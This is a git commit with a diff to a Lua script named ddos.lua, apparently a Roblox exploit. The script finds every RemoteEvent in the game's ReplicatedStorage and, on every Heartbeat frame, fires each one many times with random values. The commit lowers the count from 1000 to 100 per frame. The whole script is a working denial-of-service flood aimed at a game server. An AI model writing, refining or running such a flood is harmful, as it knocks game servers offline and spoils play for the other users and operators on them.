1b160b4e89667a58195dbffe9483c7f9c8f14e35
rustpranker <skirezik1024@gmail.com>
2025-11-19 14:11:57 +0200

    Update ddos.lua

--- ddos.lua
+++ ddos.lua
@@ -1,7 +1,7 @@
 for _, remote in next, game:GetService("ReplicatedStorage"):GetDescendants() do  
     if remote:IsA("RemoteEvent") then  
         game:GetService("RunService") .Heartbeat:Connect(function()  
-            for i = 1, 1000 do 
+            for i = 1, 100 do 
                 remote:FireServer(math.random(), math.random(), math.random())
             end  
         end)  
